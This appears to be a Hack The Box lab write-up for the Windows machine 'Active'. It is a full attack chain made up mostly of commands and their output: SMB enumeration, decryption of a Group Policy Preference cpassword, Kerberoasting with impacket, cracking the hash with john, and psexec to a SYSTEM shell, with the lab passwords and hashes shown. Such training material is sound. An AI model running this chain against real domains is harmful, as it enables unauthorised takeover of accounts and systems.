---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/hack-the-box/window-boxes/active-easy
---

# ✅ Active (Easy)

## Report-Penetration

**Vulnerable Exploit:** Group Policy Preference Exploit _**CVE MS14-025**_

**System Vulnerable:** 10.10.10.100

**Vulnerability Explanation:** By allow unauthorize user have read permission to SYSVOL folder which contain group policy and it's vulnerable to CVE-MS14-025. We were able to compromise service account by extract the hash and cracked. Any domain user could request for service ticket. By using weak password policy and improper configure user on service account.

**Privilege Escalation Vulnerability:** Kerberoasting&#x20;

**Vulnerability Fix:** Apply patch on system, implement strong password policy and using least privilege for service account.

**Severity:** Critical

**Step to Compromise the Host:**&#x20;

## Reconnaissance

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 02:09 EST
Nmap scan report for 10.10.10.100
Host is up (0.040s latency).
Not shown: 65513 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-02 07:10:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-02T07:11:13
|_  start_date: 2021-12-02T07:08:10

```

## Enumeration

### Port 445 SMB

```
└─$ smbmap -H 10.10.10.100                 
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS                                                                           
```

smbclient connection to Replication

```
└─$ smbclient //10.10.10.100/Replication   
Enter WORKGROUP\pwned's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 5690200 blocks available
smb: \> cd active.htb
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

```

### Abuse [Group Policy Preference](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)

```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

```

## Exploitation GPP

```
└─$ cat Groups.xml    
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

Crack the hash with gpp-decrypt

```
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k1
```

```
└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb            
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```

```
└─$ smbclient //10.10.10.100/Users -U SVC_TGS                                                                                                                                             1 ⨯
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

```

## Privilege Escalation

### Kerberos

```
# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out


└─$ impacket-GetUserSPNs -target-domain active.htb -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18                                                             1 ⨯
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a43952a0481d1ed504005957479f0bf3$310dd569e71de6bd1e067b6791ee1074c98a00300b601956c00626e37e08543a4f8cb6bcff8cd32072b44aa3332929331e49951c2ca5bf932b1deeb46a64378fb694e5adb0886168c6cd7aa5d2b313998339361855116ab672e6b62c2c891631c4afac6c2bbd8cf5dfe15e91b511a677294757e27eb544b8de6fca99576b738d7c6b41b38f590ba644b20cda34633ba6b2eea494c3a8af3b0bc848aaa9370268562c3204330df71e66791b5cdf7f85bbb35e23d219a0c94bc306d37110347ea19dfeb78eb3d4483e5fd4994bc493adc0a93c8057171beb041d350271f32a6534e355af991f15a8b0ff147a8dbded20088bf09874c247bcc8189c3ac28f142ed0d812f69d90837bc7d46fe43a603a96b30c165599094240af2a9c8b6831908ebbb22c67e179a55275cc109dbf18a7d323eb7756ee4186ac9304fee067c3cfd938e41d168c9c0dbbe078d9861c2ecc3c065e7d895ff221a79e924e86c18368d068153f1713a1ef5f092b79626521d8c5b4cc44b3c7a5adb63c698b9ce5592f6f7ee916adc0b6617fcefed6b87a5f5020ef94f16af6b4b8b5a77e2de0cd4c1455eb4f85ca28c5f4884d8e9cbc8abc5352d410d7daf86bff7f6d5a0bdc1922b22559b9093b5297d8f66aea29d566cb18cd7acb31b2ea896e641a2523590a84ce107595f9796450505297f19fda59130c902518399e23c31668f6e4f64d07329c575dd4a4d0cf5f95f375a8d8381d91d68e9a11738d9a7baf8d052200bdd38b708598e0136686e3dff6b099a99c646387bc2d609e7dd695b41fb3017e51dd4056fcd56869e6de51461a94a7cadb62c69341ed4a6277c458a89be0d70e5bee0eb766313ecb1f881e6b2f56f5d1204f66693e55482abbcc7e0fd15e13fe93e36dc6351e431835e15593854b013adfb3cfa56b45bcf9f9f24e9eb06e502e8265ccc12f3fb265faec66aa4d9a2879c33d95ff4853f86aa82ffe7a0b793d4293f3fa6c03a7fb7eebbdaf4f06ccd2a5e164416d30a8cc9059e5f1431ccf139736a30d909b347ace1cc3dae4be4b5d73a68e9c5d2c58b1bbcc9767ea2127e7da15690b57697cf4870ec747474dbb3e9ec61e3a997a02b14783120d4d1a7f072003557b553de32a549d9d0cc45fef0312553e8dc59bbd5aac3a54a73dca2faf8bcd2b456e0dd708735ef7a3847b6e602e644bd1127d6912f656963e8ffd3bd111325f1288e29f5781eb4d051f42b77fd68edcbbea76bbf3fea4fa75bea5e40290

```

### Crack hash kerberos

```
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:14 DONE (2021-12-02 02:48) 0.07007g/s 738421p/s 738421c/s 738421C/s Tickle7..Tibor
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
└─$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100                                                                                                                2 ⨯
Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file WDRkGcWC.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service SrbJ on 10.10.10.100.....
[*] Starting service SrbJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

